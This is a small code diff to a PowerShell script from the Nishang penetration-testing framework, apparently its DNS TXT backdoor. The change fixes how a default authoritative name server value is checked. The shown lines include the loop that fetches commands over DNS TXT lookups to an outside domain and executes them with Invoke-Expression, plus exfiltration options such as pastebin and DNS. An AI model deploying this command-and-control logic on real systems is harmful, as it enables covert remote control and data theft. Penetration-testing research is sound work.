@@ -157,7 +157,7 @@ https://github.com/samratashok/nishang
 
         [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
         [Parameter(Position = 8, Mandatory = $False, Parametersetname="noexfil")]
-        [String]$AuthNS,    
+        [String]$AuthNS = "null",
 
         [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
         [String]
@@ -196,8 +196,7 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
     {
         $exec = 0
         start-sleep -seconds 5
-        
-        if ($AuthNS -ne $null)
+        if ($AuthNS -ne "null")
         {
             $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
         }
@@ -211,7 +210,7 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
         {
             start-sleep -seconds 5
             
-            if ($AuthNS -ne $null)
+            if ($AuthNS -ne "null")
             {
                 $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
             }
@@ -242,7 +241,7 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
             while ($i -le $subdomains)
             {
                 
-                if ($AuthNS -ne $null)
+                if ($AuthNS -ne "null")
                 {
                     $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain $AuthNS")
                 }
